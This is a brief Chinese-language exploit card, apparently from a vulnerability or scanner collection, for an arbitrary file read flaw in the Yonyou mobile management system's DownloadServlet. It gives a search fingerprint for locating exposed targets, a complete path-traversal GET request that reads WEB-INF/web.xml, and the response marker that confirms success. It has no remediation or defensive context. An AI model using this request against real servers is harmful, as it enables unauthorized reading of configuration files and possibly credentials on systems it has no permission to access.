# 用友移动管理系统DownloadServlet任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`GET /servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200 web-app